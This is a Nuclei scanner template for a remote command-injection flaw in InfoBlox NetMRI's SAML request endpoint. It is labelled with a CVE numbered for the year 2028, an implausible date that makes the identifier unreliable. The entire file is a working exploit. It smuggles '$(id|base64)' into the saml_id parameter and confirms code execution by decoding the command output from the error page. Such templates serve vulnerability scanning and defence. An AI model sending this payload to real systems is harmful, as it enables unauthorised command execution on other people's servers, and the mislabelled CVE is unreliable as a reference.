id: InfoBloxNetMRI-CVE-2028-32813-RCE

info:
  name: InfoBloxNetMRI-CVE-2028-32813-RCE
  author: iSee857
  severity: high
  description: |
    InfoBloxNetMRI-CVE-2028-32813-RCE

http:
  - raw:
      - |
        GET /webui/application/get_saml_request?saml_id=1%26$(id|%20base64); HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: id
        part: body
        group: 1
        regex:
          - "sh: (.*?): command"
        internal: true

    matchers:
      - type: dsl
        dsl:
          - 'status_code==500'
          - 'contains_all(body, "sh", ": command not found")'
          - 'contains_all(base64_decode(id),"uid=","gid=")'
        condition: and
